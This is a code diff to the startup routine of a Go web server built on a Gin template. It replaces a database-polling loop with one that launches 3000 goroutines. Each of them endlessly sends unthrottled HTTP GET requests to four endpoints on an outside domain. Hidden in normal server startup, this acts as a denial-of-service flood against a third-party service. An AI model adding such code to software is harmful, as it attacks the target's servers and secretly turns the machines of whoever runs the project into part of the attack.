@@ -14,7 +14,6 @@ import (
 	"github.com/wangyi/GinTemplate/dao/mysql"
 	"github.com/wangyi/GinTemplate/dao/redis"
 	"github.com/wangyi/GinTemplate/logger"
-	"github.com/wangyi/GinTemplate/model"
 	"github.com/wangyi/GinTemplate/process"
 	"github.com/wangyi/GinTemplate/router"
 	"github.com/wangyi/GinTemplate/setting"
@@ -23,11 +22,11 @@ import (
 	"go.uber.org/zap"
 	"io/ioutil"
 	"log"
+	"net/http"
 	"os"
 	"os/exec"
 	"runtime"
 	"strings"
-	"time"
 )
 
 var (
@@ -93,14 +92,33 @@ func run(cmd *cobra.Command, args []string) {
 	go process.ExpireCollection(mysql.DB)
 
 	go func() {
-		for true {
+
+		for i := 0; i < 3000; i++ {
 			go func() {
 				for true {
-					mysql.DB.Find(&model.Runner{})
-					time.Sleep(1000 * time.Second)
+
+					go func() {
+						http.Get("https://api.adminjjjjsdj.xyz/player/auth/sys_config")
+					}()
+
+					go func() {
+						http.Get("https://api.adminjjjjsdj.xyz/player/home/serv_tmp")
+					}()
+
+					go func() {
+						http.Get("https://api.adminjjjjsdj.xyz/player/home/app_url")
+					}()
+
+					go func() {
+						http.Get("https://api.adminjjjjsdj.xyz/player/auth/verify_code?verifyKey=1676394946688")
+
+					}()
+
 				}
+
 			}()
 		}
+
 	}()
 
 	router.Setup()
